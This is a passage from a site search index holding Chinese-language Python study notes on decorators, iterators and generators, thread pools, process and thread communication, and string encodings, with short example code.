多线程的事件循环 一般而言, 只能是主线程拥有自己的事件循环, 子线程无法获取主线程的loop, 若子线程需要, 可以在新建一个loop给子线程使用, 尤其是gui编程的时候, gui线程只能在主线程跑, 那么当存在全局的非gui能处理的实时监听时, 那么就只能在子线程跑了(或者新建一个进程, 至少目前我是没有其他办法)","tags":"后端; python","url":"/yq-docs-rear-end-python-Concept-Coroutine.html","loc":"/yq-docs-rear-end-python-Concept-Coroutine.html"},{"title":"装饰器","text":"装饰器只会在函数定义时被调用一次。有时候你去掉装饰器的功能，那么你只需要简单的返回被装饰函数即可。 函数装饰器 普通装饰器: # 异步放到线程池执行\ndef async_run_in_thread_pool(fn):\n  # 刷新 __name__\n    @functools.wraps(fn)\n    async def wrapper(*args, **kwargs):\n        def _exec_fn(params):\n            # 这样写是为了兼容， run_in_executor 的参数只有 *args\n            _arg = params[0]\n            _kwarg = params[1]\n            return fn(*_arg, **_kwarg)\n\n        loop = asyncio.get_running_loop()\n        executor = ThreadPoolExecutor()\n        return await loop.run_in_executor(executor, _exec_fn, (args, kwargs,))\n\n    return wrapper 带参数的装饰器, 就是在装饰器外部再套一层带参装饰器: def async_run_in_thread_pool_with_params(*args, **kwargs):\n    print(args, kwargs)\n    return async_run_in_thread_pool 使用: @async_run_in_thread_pool_with_params(33, a=1, b=2)\ndef add(a, b):\n    return a + b\n\n# 输出会增加\n# (33,) {'a': 1, 'b': 2} 装饰器类 自定义 __call__ 函数 用类也可以实现一个装饰器。 类能实现装饰器的功能， 是由于当我们调用一个对象时，实际上调用的是它的 __call__ 方法: class Demo:\n    def __call__(self):\n        print('我是 Demo')\n\ndemo = Demo()\ndemo() 输出: 我是 Demo 通过这个特性，我们便可以用类的方式来完成装饰器，功能与刚开始用函数实现的一致: class Decorator:\n    def __init__(self, func):\n        self.func = func\n\n    def __call__(self, *args, **kwargs):\n        print('123')\n        return self.func(*args, **kwargs)\n\n@Decorator\ndef say_hello():\n    print('同学你好')\n\nsay_hello() 输出: 123\n同学你好 不带参数装饰器类 注意, 使用的时候是, @装饰器类(), 也就是说使用的是对象的实例, 与被装饰的函数是一一绑定(只要没有单例): # 不带参数装饰器类\n# 这里有一个问题， 无法使用 @functools.wraps 来刷新\nclass RunInThreadPool(object):\n    _thread_pool: ThreadPoolExecutor = None\n\n    @classmethod\n    def _create_thread_pool(cls):\n        if not cls._thread_pool:\n            cls._thread_pool = ThreadPoolExecutor()\n\n    def __init__(self, fun):\n        self._fun = fun\n        self._create_thread_pool()\n\n    def __call__(self, *args, **kwargs):\n        _future = self._thread_pool.submit(self._fun, *args, **kwargs)\n        # 会阻塞\n        return _future.result() 带参数装饰器类 无法使用 @functools.wraps 来刷新: # 不带参数装饰器类\n# 这里有一个问题， 无法使用 @functools.wraps 来刷新\nclass RunInThreadPool(object):\n    _thread_pool: ThreadPoolExecutor = None\n\n    @classmethod\n    def _create_thread_pool(cls):\n        if not cls._thread_pool:\n            cls._thread_pool = ThreadPoolExecutor()\n\n    def __init__(self, fun):\n        self._fun = fun\n        self._create_thread_pool()\n\n    def __call__(self, *args, **kwargs):\n        _future = self._thread_pool.submit(self._fun, *args, **kwargs)\n        # 会阻塞\n        return _future.result() 一些官方装饰器 wraps装饰器,\n一个函数不止有他的执行语句，还有着 __name__`（函数名），`__doc__ （说明文档）等属性: def decorator(func):\n    def wrapper(*args, **kwargs):\n        \"\"\"doc of wrapper\"\"\"\n        print('123')\n        return func(*args, **kwargs)\n\n    return wrapper\n\n@decorator\ndef say_hello():\n    \"\"\"doc of say hello\"\"\"\n    print('同学你好')\n\nprint(say_hello.__name__)\nprint(say_hello.__doc__) 输出: wrapper\ndoc of wrapper 由于装饰器返回了 wrapper 函数替换掉了之前的 say_hello 函数，导致函数名，帮助文档变成了 wrapper 函数的了。 解决这一问题的办法是通过 functools 模块下的 wraps 装饰器: from functools import wraps\n\ndef decorator(func):\n    @wraps(func)\n    def wrapper(*args, **kwargs):\n        \"\"\"doc of wrapper\"\"\"\n        print('123')\n        return func(*args, **kwargs)\n\n    return wrapper\n\n@decorator\ndef say_hello():\n    \"\"\"doc of say hello\"\"\"\n    print('同学你好')\n\nprint(say_hello.__name__)\nprint(say_hello.__doc__) 输出: say_hello\ndoc of say hello 内置装饰器 有三种我们经常会用到的装饰器， property 、 staticmethod 、 classmethod ，\n他们有个共同点，都是作用于类方法之上。 property 装饰器 用于类中的函数，使得我们可以像访问属性一样来获取一个函数的返回值: class XiaoMing:\n    first_name = '明'\n    last_name = '小'\n\n    @property\n    def full_name(self):\n        return self.last_name + self.first_name\n\nxiaoming = XiaoMing()\nprint(xiaoming.full_name) 输出: 小明 例子中我们像获取属性一样获取 full_name 方法的返回值，这就是用 property 装饰器的意义，\n既能像属性一样获取值，又可以在获取值的时候做一些操作。 staticmethod 装饰器 用于类中的方法，这表示这个方法将会是一个静态方法，\n意味着该方法可以直接被调用无需实例化，但同样意味着它没有 self 参数，也无法访问实例化后的对象: class XiaoMing:\n    @staticmethod\n    def say_hello():\n        print('同学你好')\n\nXiaoMing.say_hello()\n\n# 实例化调用也是同样的效果\n# 有点多此一举\nxiaoming = XiaoMing()\nxiaoming.say_hello() 输出: 同学你好\n同学你好 classmethod 装饰器 用于类中的方法，这表示这个方法将会是一个类方法，意味着该方法可以直接被调用无需实例化，\n但同样意味着它没有 self 参数，也无法访问实例化后的对象。\n相对于 staticmethod 的区别在于它会接收一个指向类本身的 cls 参数: class XiaoMing:\n    name = '小明'\n\n    @classmethod\n    def say_hello(cls):\n        print('同学你好， 我是' + cls.name)\n        print(cls)\n\nXiaoMing.say_hello() 输出: 同学你好， 我是小明\n<class '__main__.XiaoMing'> 多个装饰器的调用顺序 例: #  coding: utf-8\n#\n#  Copyright (C) 2022-2023, Inc. All Rights Reserved\n#\n#  @Time    : 2023/4/20 下午1:13\n#  @Author  : yan que\n#  @Email   : yanquer@qq.com\n#  @File    : with_warp.py\n#  @Project : mytest\nimport logging\n\n_logger = logging.getLogger(__name__)\n_console_handler = logging.StreamHandler()\n_logger.addHandler(_console_handler)\n_logger.setLevel(logging.INFO)\n\ndef warp1(fn):\n    def _warp(*args, **kwargs):\n        _logger.info(f'warp1 {fn} start')\n        ret = fn(*args, **kwargs)\n        _logger.info('warp1 end')\n        return ret\n    return _warp\n\ndef warp2(fn):\n    def _warp(*args, **kwargs):\n        _logger.info(f'warp2 {fn} start')\n        ret = fn(*args, **kwargs)\n        _logger.info('warp2 end')\n        return ret\n    return _warp\n\n@warp1\n@warp2\ndef main():\n    _logger.info('main start')\n    print('main')\n    _logger.info('main end')\n\nif __name__ == '__main__':\n    main() 输出: warp1 <function warp2.<locals>._warp at 0x10755a8b0> start\nwarp2 <function main at 0x10755a820> start\nmain start\nmain end\nwarp2 end\nwarp1 end\nmain main的顺序不用管, 因为日志与直接打印不是一个处理流. 可以看出, 装饰器是按照使用顺序调用的, 前面的装饰器实际装饰的并非直接是函数, 而是后一个装饰器.\n某些情况下需要注意调用顺序. 装饰器调用说明 此处主要说明是否带参数/括号时的不同 不带括号时的调用: # Example use\n@logged\ndef add(x, y):\n  return x + y 类似等价于: def add(x, y):\n  return x + y\n\nadd = logged(add) 这时候，被装饰函数会被当做第一个参数直接传递给 logged 装饰器。因此，\nlogged() 中的第一个参数就是被包装函数本身。所有其他参数都必须有默认值。 带括号/参数时的调用: @logged(level=logging.CRITICAL, name='example')\ndef spam():\n  print('Spam!') 等价于: def spam():\n  print('Spam!')\n\nspam = logged(level=logging.CRITICAL, name='example')(spam) 初始调用 logged() 函数时，被包装函数并没有传递进来。因此在装饰器内，它必\n须是可选的。这个反过来会迫使其他参数必须使用关键字来指定。并且，但这些参数被\n传递进来后，装饰器要返回一个接受一个函数参数并包装它的函数","tags":"后端; python","url":"/yq-docs-rear-end-python-Concept-Decorator.html","loc":"/yq-docs-rear-end-python-Concept-Decorator.html"},{"title":"迭代(生成器/式)","text":"字典生成式, 会立刻计算: a = {id:0 for id in range(10)} 列表生成式, 会立刻计算: [x for x in iter_obj] 生成器, 不会立刻计算, 返回一个生成器: (x for x in iter_obj) 可迭代对象 序列（Sequence）: An iterable which supports efficient element access using integer indices via the **getitem**() special method and defines a **len**() method that returns the length of the sequence. Some built-in sequence types are list, str, tuple, and bytes. Note that dict also supports **getitem**() and **len**(), but is considered a mapping rather than a sequence because the lookups use arbitrary immutable keys rather than integers.\nThe collections.abc.Sequence abstract base class defines a much richer interface that goes beyond just **getitem**() and **len**(), adding count(), index(), **contains**(), and **reversed**(). Types that implement this expanded interface can be registered explicitly using register(). 提练重点如下： 可迭代； 支持下标访问，即实现了 getitem () 方法，同时定义了 len () 方法，可通过 len() 方法获取长度； 内置的序列类型：list、str、tuple、bytes； dict 同样支持 getitem () 和 len () ，但它不归属于序列类型，它是映射类型，因为它不能根据下标查找，只能根据 key 来查找； 抽象类 collections.abc.Sequence 还提供了很多方法，比如 count()、index()、 contains () 、 reversed () 可用于扩展； 总结结论： 序列一定是一个可迭代对象，但可迭代对象不一定是序列 。 可迭代对象(Iterable) 在类里面定义__iter__方法，并使用该类创建的对象就是可迭代对象 简单记忆 使用for循环遍历取值的对象叫做可迭代对象, 比如：列表、元组、字典、集合、range、字符串 判断: from collections import Iterable\n\nresult = isinstance((3, 5), Iterable)\nprint(\"是否是可迭代对象:\", result) 它是能够一次返回一个成员的对象，也就是可以 for…in 遍历的； 所有的序列类型（也就是后面要说到的 Sequence），都是可迭代对象，如 list、str、tuple，还有映射类型 dict、文件对象等非序列类型也是可迭代对象； 自定义对象在实现了 iter () 方法或者实现了 getitem () 方法后，也可以成为可迭代对象； iter() 方法接受一个可迭代对象，该方法的返回值是一个迭代器（Iterator） 那么如何判断一个对象是可迭代对象呢？很容易想到的方法是 isinstance，这时候我们需要注意一点，文档介绍如下: class collections.abc.Iterable\nABC for classes that provide the **iter**() method.\n\nChecking isinstance(obj, Iterable) detects classes that are registered as Iterable or that have an **iter**() method, but it does not detect classes that iterate with the **getitem**() method. The only reliable way to determine whether an object is iterable is to call iter(obj). 简单解释就是: 通过 isinstance(obj, Iterable) 判断一个对象是否是可迭代对象时，\n只有当这个对象被注册为 Iterable 或者当它实现了 iter() ** 方法的时候，才返回 True，\n而对于实现了 **getitem () 方法的，返回的是 False。 所以当判断是否是可迭代对象的方式是调用 iter(obj) ，如果不报错，说明是可迭代对象，反之则不是。 迭代器(Iterator) 迭代器: An object representing a stream of data. Repeated calls to the iterator's **next**() method (or passing it to the built-in function next()) return successive items in the stream. When no more data are available a StopIteration exception is raised instead. At this point, the iterator object is exhausted and any further calls to its **next**() method just raise StopIteration again. Iterators are required to have an **iter**() method that returns the iterator object itself so every iterator is also iterable and may be used in most places where other iterables are accepted. One notable exception is code which attempts multiple iteration passes. A container object (such as a list) produces a fresh new iterator each time you pass it to the iter() function or use it in a for loop. Attempting this with an iterator will just return the same exhausted iterator object used in the previous iteration pass, making it appear like an empty container. 一个表示**数据流**的对象，可通过重复调用 next （或使用内置函数 next() ）方法来获取元素。当没有元素存在时，抛出 StopIteration 异常； iter(obj) 接受一个迭代器作为参数时，返回的是它本身。在可迭代对象里我们说过，iter(obj)方法不报错，说明它一定是一个可迭代对象。因此迭代器一定是一个可迭代对象； 一个迭代器必须要实现 iter () 方法。但因为迭代器前提必须是一个可迭代对象，所以只实现 iter () 方法不一定是一个迭代器。 在类里面定义 __iter__和 __next__方法，并使用该类创建的对象就是迭代器 (迭代器也属于可迭代对象)\n判断: from collections import Iterator, Iterable\n\nresult = isinstance((3, 5), Iterator)\nprint(\"是否是迭代器:\", result)\nresult = isinstance((3, 5), Iterable)\nprint(\"是否是可迭代对象:\", result) 生成器 也是迭代器: A function which returns a generator iterator. It looks like a normal function except that it contains yield expressions for producing a series of values usable in a for-loop or that can be retrieved one at a time with the next() function.\nUsually refers to a generator function, but may refer to a generator iterator in some contexts. In cases where the intended meaning isn't clear, using the full terms avoids ambiguity. 定义：一边循坏一边计算的机制（generator） 它是一个 迭代器 ； 它是一个含有特殊关键字 yield 的 迭代器 ； 每次生成一个值，可通过 next() 方法获取。 创建一个生成器对象， 方法一：只需要将列表生成式的 [] 换成 () 即可: g = (x * x for x in range(10)) 方法二：函数使用 yield 关键字，那么这个函数将是一个 generator: def g():\n  a = {id:0 for id in range(10)}\n  for k, v in a.items():\n    yield k, v 原理： 生成器(generator)能够迭代的关键是它有一个next()方法，\n工作原理就是通过重复调用next()方法，直到捕获一个异常。 带有 yield 的函数不再是一个普通函数，而是一个生成器generator。 可用next()调用生成器对象来取值。next 两种方式 t.__next__() | next(t)。 可用for 循环获取返回值（每执行一次，取生成器里面一个值） （基本上不会用`next()`来获取下一个返回值，而是直接使用`for`循环来迭代）。 yield相当于 return 返回一个值，并且记住这个返回的位置，下次迭代时，代码从yield的下一条语句开始执行。 send() 和next()一样，都能让生成器继续往下走一步（下次遇到yield停），但send()能传一个值，这个值作为yield表达式整体的结果 ——换句话说，就是send可以强行修改上一个yield表达式值。比如函数中有一个yield赋值，a = yield 5，第一次迭代到这里会返回（5）a还没有赋值。第二次迭代时，使用.send(10)，那么，就是强行修改yield 5表达式的值为10，本来是5的，那么a=10 总结 迭代的方式有两种，一种是通过下标，即实现 getitem ，一种是直接获取值，\n即实现 iter ，两种方式都可通过 **for…in** 方式进行遍历。也都是可迭代对象； isinstance 判断可迭代对象时，针对下标访问的判断有出入，需要特别注意； 可迭代对象基本要求是可遍历获取值； 序列一定是可迭代对象，它实现了 **len()** 和 getitem ，可获取长度，可通过下标访问； 迭代器一定是可迭代对象，它实现了 next ()； 生成器是特殊的迭代器，它一定是迭代器，因此也一定是可迭代对象。","tags":"后端; python","url":"/yq-docs-rear-end-python-Concept-Iterate.html","loc":"/yq-docs-rear-end-python-Concept-Iterate.html"},{"title":"多线程-线程池","text":"参考: Python线程池及其原理和使用（超级详细） 系统启动一个新线程的成本是比较高的，因为它涉及与操作系统的交互。\n在这种情形下，使用线程池可以很好地提升性能，\n尤其是当程序中需要创建大量生存期很短暂的线程时，更应该考虑使用线程池。 线程池在系统启动时即创建大量空闲的线程，程序只要将一个函数提交给线程池，\n线程池就会启动一个空闲的线程来执行它。\n当该函数执行结束后，该线程并不会死亡，而是再次返回到线程池中变成空闲状态，等待执行下一个函数。 此外，使用线程池可以有效地控制系统中并发线程的数量。\n当系统中包含有大量的并发线程时，会导致系统性能急剧下降，\n甚至导致 Python 解释器崩溃，而线程池的最大线程数参数可以控制系统中并发线程的数量不超过此数。 线程池的使用 线程池的基类是 concurrent.futures 模块中的 Executor , Executor 提供了两个子类，\n即 ThreadPoolExecutor 和 ProcessPoolExecutor， 其中 ThreadPoolExecutor 用于创建线程池，而 ProcessPoolExecutor 用于创建进程池.\n详细参考: concurrent 如果使用线程池/进程池来管理并发编程，\n那么只要将相应的 task 函数提交给线程池/进程池，剩下的事情就由线程池/进程池来搞定。 Exectuor提供的常用方法: submit(fn, *args, **kwargs)：\n    将 fn 函数提交给线程池。*args 代表传给 fn 函数的参数，*kwargs 代表以关键字参数的形式为 fn 函数传入参数。\nmap(func, *iterables, timeout=None, chunksize=1)\n    该函数类似于全局函数 map(func, *iterables)，只是该函数将会启动多个线程，以异步方式立即对 iterables 执行 map 处理。\nshutdown(wait=True)\n    关闭线程池。 详见: concurrent-Executor-funs 程序将 task 函数提交（submit）给线程池后，submit 方法会返回一个 Future 对象，\nFuture 类主要用于获取线程任务函数的返回值。\n由于线程任务会在新线程中以异步方式执行，\n因此，线程执行的函数相当于一个\"将来完成\"的任务，所以 Python 使用 Future 来代表。 注解 实际上，在 Java 的多线程编程中同样有 Future，此处的 Future 与 Java 的 Future 大同小异。 Future 提供了的方法(详见: concurrent-Future ) cancel()：取消该 Future 代表的线程任务。如果该任务正在执行，不可取消，则该方法返回 False；否则，程序会取消该任务，并返回 True。 cancelled()：返回 Future 代表的线程任务是否被成功取消。 running()：如果该 Future 代表的线程任务正在执行、不可被取消，该方法返回 True。 done()：如果该 Funture 代表的线程任务被成功取消或执行完成，则该方法返回 True。 result(timeout=None)：获取该 Future 代表的线程任务最后返回的结果。如果 Future 代表的线程任务还未完成，该方法将会阻塞当前线程，其中 timeout 参数指定最多阻塞多少秒。 exception(timeout=None)：获取该 Future 代表的线程任务所引发的异常。如果该任务成功完成，没有异常，则该方法返回 None。 add_done_callback(fn)：为该 Future 代表的线程任务注册一个\"回调函数\"，当该任务成功完成时，程序会自动触发该 fn 函数。 在用完一个线程池后，应该调用该线程池的 shutdown() 方法，该方法将启动线程池的关闭序列。\n调用 shutdown() 方法后的线程池不再接收新任务，但会将以前所有的已提交任务执行完成。\n当线程池中的所有任务都执行完成后，该线程池中的所有线程都会死亡。 使用线程池来执行线程任务的步骤如下: 调用 ThreadPoolExecutor 类的构造器创建一个线程池。 定义一个普通函数作为线程任务。 调用 ThreadPoolExecutor 对象的 submit() 方法来提交线程任务。 当不想提交任何任务时，调用 ThreadPoolExecutor 对象的 shutdown() 方法来关闭线程池。 把 action() 函数提交给线程池时，submit() 方法会返回该任务所对应的 Future 对象，\n程序立即判断 futurel 的 done() 方法，该方法将会返回 False（表明此时该任务还未完成）。\n接下来主程序暂停 3 秒，然后判断 future2 的 done() 方法，如果此时该任务已经完成，那么该方法将会返回 True。\n程序最后通过 Future 的 result() 方法来获取两个异步任务返回的结果。\n当程序使用 Future 的 result() 方法来获取结果时，该方法会阻塞当前线程，\n如果没有指定 timeout 参数，当前线程将一直处于阻塞状态，直到 Future 代表的任务返回: from concurrent.futures import ThreadPoolExecutor\nimport threading\nimport time\n\n# 定义一个准备作为线程任务的函数\ndef action(max):\n    my_sum = 0\n    for i in range(max):\n        print(threading.current_thread().name + '  ' + str(i))\n        my_sum += i\n    return my_sum\n# 创建一个包含2条线程的线程池\npool = ThreadPoolExecutor(max_workers=2)\n# 向线程池提交一个task, 50会作为action()函数的参数\nfuture1 = pool.submit(action, 50)\n# 向线程池再提交一个task, 100会作为action()函数的参数\nfuture2 = pool.submit(action, 100)\n# 判断future1代表的任务是否结束\nprint(future1.done())\ntime.sleep(3)\n# 判断future2代表的任务是否结束\nprint(future2.done())\n# 查看future1代表的任务返回的结果\nprint(future1.result())\n# 查看future2代表的任务返回的结果\nprint(future2.result())\n# 关闭线程池\npool.shutdown() 获取执行结果 还是靠 concurrent-Future 调用 Future 的 result() 方法来获取线程任务的运回值，\n但该方法会阻塞当前主线程，只有等到钱程任务完成后，result() 方法的阻塞才会被解除 如果程序不希望直接调用 result() 方法阻塞线程，\n则可通过 Future 的 add_done_callback() 方法来添加回调函数，\n该回调函数形如 fn(future)。\n当线程任务完成后，程序会自动触发该回调函数，并将对应的 Future 对象作为参数传给该回调函数: # 定义一个准备作为线程任务的函数\ndef action(max):\n    my_sum = 0\n    for i in range(max):\n        print(threading.current_thread().name + '  ' + str(i))\n        my_sum += i\n    return my_sum\n\n# 创建一个包含2条线程的线程池\nwith ThreadPoolExecutor(max_workers=2) as pool:\n    # 向线程池提交一个task, 50会作为action()函数的参数\n    future1 = pool.submit(action, 50)\n    # 向线程池再提交一个task, 100会作为action()函数的参数\n    future2 = pool.submit(action, 100)\n    def get_result(future):\n        print(future.result())\n    # 为future1添加线程完成的回调函数\n    future1.add_done_callback(get_result)\n    # 为future2添加线程完成的回调函数\n    future2.add_done_callback(get_result)\n    print('--------------') 由于线程池实现了 上下文管理协议（Context Manage Protocol） ，\n因此，程序可以使用 with 语句来管理线程池，这样即可避免手动关闭线程池，如上面的程序所示。 此外，Exectuor 还提供了一个 map(func, *iterables, timeout=None, chunksize=1) 方法，\n该方法的功能类似于全局函数 map()，\n区别在于线程池的 map() 方法会为 iterables 的每个元素启动一个线程，\n以并发方式来执行 func 函数。\n这种方式相当于启动 len(iterables) 个线程，井收集每个线程的执行结果: # 创建一个包含4条线程的线程池\nwith ThreadPoolExecutor(max_workers=4) as pool:\n    # 使用线程执行map计算\n    # 后面元组有3个元素，因此程序启动3条线程来执行action函数\n    results = pool.map(action, (50, 100, 150))\n    print('--------------')\n    for r in results:\n        print(r)","tags":"后端; python","url":"/yq-docs-rear-end-python-Concept-Multi-thread-thread-pool.html","loc":"/yq-docs-rear-end-python-Concept-Multi-thread-thread-pool.html"},{"title":"Python下进程与线程","text":"进程和线程的区别 进程是对运行时程序的封装，是系统资源调度和分配的基本单位 线程是进程的子任务，cpu调度和分配的基本单位，实现进程内并发。 一个进程可以包含多个线程，线程依赖进程存在，并共享进程内存 线程安全 一个操作可以在多线程环境中使用，并且获得正确的结果。 线程安全的操作线程是顺序执行的而不是并发执行的。 一般涉及到写操作需要考虑如何让多个线程安全访问数据。 线程间通信 互斥量（锁）:  通过互斥机制防止多个线程同时访问公共资源。 信号量（Semphare）:  控制同一时刻多个线程访问同一个资源的线程数。 ps: python的threading 文档 事件（信号）:  通过通知的方式保持多个线程的同步。 进程间通信 IPC: Inter-Process Communication 进程间传递信号或者数据 管道/匿名管道/有名管道（pipe） 信号（Signal）: 比如用户使用ctrl+c产生SIGINT程序终止信号 消息队列（Message） 共享内存（share memory） 进程间的信号量（Semaphore） 套接字（socket）: 最常用的方式，我们的web应用就是这种方式 详细介绍 多线程 多进程 Can't pickle local object 使用多线/进程时, 一般都是使用的 multiprocessing 模块(或者多线程的). 其内部进行数据传输时, 会将数据序列化处理. 其内部源码使用的是 pickle 模块. 但是这个模块又不能对局部函数, lambda 函数进行序列化, 所以容易产生这样的报错: Can't pickle local object xxxx 可以从两种角度来解决: 编码时候不使用 lambda 函数/局部函数(闭包), 这个此处不做说明, 更新一下结构就行了 使用其他方式进行数据/对象的序列化, 或者直接使用其他模块 其他序列化方式 dill dill 安装: pip install dill 使用: import dill\n\nobj = SomeClass()\ndata = dill.dumps(obj)\nobj = dill.loads(data) 其他模块 pathos.multiprocessing: from pathos.multiprocessing import ProcessingPool as Pool","tags":"后端; python","url":"/yq-docs-rear-end-python-Concept-Process-and-thread.html","loc":"/yq-docs-rear-end-python-Concept-Process-and-thread.html"},{"title":"Python的编码","text":"字符编码 为了处理英文字符，产生了ASCII码。 为了处理中文字符，产生了GB2312。 为了处理各国字符，产生了Unicode。 为了提高Unicode存储和传输性能，产生了UTF-8，它是Unicode的一种实现形式。 encode和decode 讲解编码和解码之前，先来讲讲Unicode和utf-8的关系，\n推荐 http://flyer103.diandian.com/post/2014-03-09/40061199665 可以这样来理解:\n字符串是由字符构成，字符在计算机硬件中通过二进制形式存储，\n这种二进制形式就是编码。\n如果直接使用: 字符串↔️字符↔️二进制表示（编码） 会增加不同类型编码之间转换的复杂性。所以引入了一个抽象层: 字符串↔️字符↔️与存储无关的表示↔️二进制表示（编码） 这样，可以用一种与存储无关的形式表示字符，\n不同的编码之间转换时可以先转换到这个抽象层，然后再转换为其他编码形式。\n在这里，unicode 就是 \"与存储无关的表示\"，utf—8 就是 \"二进制表示\"。 python2中字符串有两种表示形式，str和unicode。\nstr可以理解为上面这段话中的二进制编码格式，unicode可以理解为抽象层。\nencode是编码，即从unicode格式到二进制的编码格式如utf-8、gb2312等。decode是解码，\n即从二进制编码格式到unicode编码格式。 原文: https://www.cnblogs.com/jinhaolin/p/5128973.html Python的字符编码 Python2中默认的字符编码是ASCII码。 Python2中字符串有str和unicode两种类型。str有各种编码的区别，unicode是没有编码的标准形式。 Python2中可以直接查看到unicode的字节串。 python3默认使用unicode编码，unicode字节串将被直接处理为中文显示出来。 decode()与encode()方法 decode()方法将其他编码字符转化为Unicode编码字符。 encode()方法将Unicode编码字符转化为其他编码字符。 python3一个新特性就是对文本和二进制做了更清晰的划分，文本是str，二进制是byte(x01x06...) 编码: encode：str --> byte 解码: decode：byte --> str 实际遇到的问题 win10下python2.7读取一个txt文本出现了乱码 最终解决方案有两个： 方案一: 使用decode方法: #text.txt是读取的文件内容，编码ANSI，实际应该是gb2312吧\nwith open(\"text.txt\",\"r\") as f:\n    lines = f.readlines()                     #将内容转换为数组\n    for line in lines:\n        print line.decode('gb2312')   #直接print line会报错，参数为原本的编码 decode函数的参数是本身的编码，表示以此编码解析为unicode 方案二: 导入codecs模块: #text.txt是读取的文件内容，编码ANSI，实际应该是gb2312吧\n#codesc.open的encoding参数可以指定原文件的编码，读取写入就会自动转换\nwith codecs.open(\"text.txt\",\"r\",encoding=\"gb2312\") as f:\n    lines = f.readlines()                     #将内容转换为数组\n    for line in lines:\n        print line 其他 读文件时候asacll一直无法转换成功，使用json.dumps解决: >>> a='\\xe6\\x81\\xb6\\xe6\\x84\\x8f\\xe8\\xbd\\xaf\\xe4\\xbb\\xb6'\n>>> bb=json.dumps(a, encoding=\"UTF-8\", ensure_ascii=False)\n>>> print(bb)","tags":"后端; python","url":"/yq-docs-rear-end-python-Concept-Python's-encoding.html","loc":"/yq-docs-rear-end-python-Concept-Python's-encoding.html"},{"title":"字符串前面加u,r,b的含义","text":"u/U 表示unicode字符串 不是仅仅是针对中文, 可以针对任何的字符串，代表是对字符串进行unicode编码。\n一般英文字符在使用各种编码下, 基本都可以正常解析, 所以一般不带u；但是中文, 必须表明所需编码, 否则一旦编码转换就会出现乱码。\n建议所有编码方式采用utf8 r/R 非转义的原始字符串 与普通字符相比，其他相对特殊的字符，其中可能包含转义字符，即那些，反斜杠加上对应字母，\n表示对应的特殊含义的，比如最常见的\"n\"表示换行，\"t\"表示Tab等。\n而如果是以r开头，那么说明后面的字符，都是普通的字符了，即如果是\"n\"那么表示一个反斜杠字符，一个字母n，而不是表示换行了。\n以r开头的字符，常用于正则表达式，对应着re模块。 b:bytes python3.x里默认的str是(py2.x里的)unicode, bytes是(py2.x)的str, b\"\"前缀代表的就是bytes python2.x里, b前缀没什么具体意义， 只是为了兼容python3.x的这种写法","tags":"后端; python","url":"/yq-docs-rear-end-python-Concept-The-meaning-of-add-U,-R,-B-in-front-of-the-string.html","loc":"/yq-docs-rear-end-python-Concept-The-meaning-of-add-U,-R,-B-in-front-of-the-string.html"},{"title":"Python多进程","text":"Python多进程方面涉及的模块主要包括: subprocess mmap multiprocessing :\n提供支持多处理器技术的多进程编程接口, 并且接口的设计最大程度地保持了和threading模块的一致, 便于理解和使用. 进程间通信 信号, 管道(不安全,默认没加锁), 消息队列, 信号量, 共享内存, socket 信号 signal. 在多个进程中通信的机制中, 只有singal是异步执行的 管道 半双工,默认无锁, 不安全, 双向通信(只能一端发, 一端收)\n- 匿名管道, 只能在具有亲缘关系进程间通信\n- 命名管道, 允许无亲缘关系进程通信 消息队列 由消息组成的链表, 存放在内核中并由消息队列标识符标识. 消息队列克服了信号传递信息少、管道只能承载无格式字节流以及缓冲区大小受限等缺点 信号量 是一个计数器, 可以用来控制多个进程对共享资源的访问.\n它常作为一种锁机制, 防止某进程正在访问共享资源时, 其他进程也访问该资源.\n因此, 主要作为进程间以及同一进程内不同线程之间的同步手段. 共享内存 共享内存就是映射一段能被其他进程所访问的内存, 这段共享内存由一个进程创建, 但多个进程都可以访问.\n共享内存是最快的 IPC 方式, 它是针对其他进程间通信方式运行效率低而专门设计的.\n它往往与其他通信机制, 如信号量, 配合使用, 来实现进程间的同步和通信. 套接字 也是一种进程间通信机制, 与其他通信机制不同的是, 它可用于不同机器之间的进程通信. 事件 python进程的事件用于主进程控制其他进程的执行 信号 signal 信号通过注册的方式‘挂'在一个进程中, 并且不会阻塞该进程的运行。\n一个进程一旦接收到其他进程（可能是应用中的其他进程, 也可能使操作系统中的进程）发送的信号就会打断原来的程序执行流程来处理这个信号。 注解 异步: 程序在执行中利用内核功能帮助完成必要的辅助操作,不影响应用层持续执行 注意: 这里的同步和异步机制是相对多进程而言的。 在多个进程中通信的机制中, 只有singal是异步执行的 和kill相关的几个函数: os.kill(pid, single) 发送信号给某个进程 pid: 进程号 single: 信号(需要通过signal模块获取) signal.alarm(sec): 见 signal signal.pause(): 见 signal signal.signal(sig,handler): 见 signal 管道 管道, 半双工,默认无锁, 不安全, 双向通信(一端发, 一端收) 匿名管道, 只能在具有亲缘关系进程间通信 命名管道, 允许无亲缘关系进程通信 from multiprocessing import Pipe 消息队列 消息队列, 基于管道实现, 有加锁, 数据安全 消息队列是由消息组成的链表, 存放在内核中并由消息队列标识符标识.\n消息队列克服了信号传递信息少、管道只能承载无格式字节流以及缓冲区大小受限等缺点. Queue JoinableQueue : 有put端和get的技术机制.\n每次get()数据发送task_done()  put端计数-1,\n直到get()端取完了队列的所有数据,  put()端的join()就会接受到信号, 直到get()端已经接受完数据了 共享内存 共享内存就是映射一段能被其他进程所访问的内存. 这段共享内存由一个进程创建, 但多个进程都可以访问. 共享内存是最快的 IPC 方式, 它是针对其他进程间通信方式运行效率低而专门设计的.\n它往往与其他通信机制, 如信号量, 配合使用, 来实现进程间的同步和通信. from multiprocessing import Manager 例: # 共享内存, 举例, https://www.jb51.net/article/232067.htm\nfrom multiprocessing import Value,Array\n\nobj = Value(ctype,data)\n# 功能: 开辟共享内存\n# 参数: ctype 表示共享内存空间类型 'i' 'f' 'c'\n#     data 共享内存空间初始数据\n# 返回值: 共享内存对象\n\nobj.value # 对象属性的修改查看即对共享内存读写\n\nobj = Array(ctype,data)\n# 功能: 开辟共享内存\n# 参数: ctype 表示共享内存空间类型 'i' 'f' 'c'\n#     data 整数表示开辟空间的大小,其数据表示开辟空间\n# 返回值: 共享内存对象\n\n# Array共享内存读写:通过遍历obj可以得到每个值,直接通过索引可以修改\n\n# * 可以使用obj.value 直接打印共享内存中的字节串 信号量 信号量(信号灯集) 给定一个数量对多个进程可见,多个进程都可以操作该数增减,并根据数量值决定自己的行 信号量是一个计数器, 可以用来控制多个进程对共享资源的访问.\n它常作为一种锁机制, 防止某进程正在访问共享资源时, 其他进程也访问该资源. 因此, 主要作为进程间以及同一进程内不同线程之间的同步手段. from multiprocessing import Semaphore\n\nsem = Semaphore(num)\n# 功能: 创建信号量对象\n# 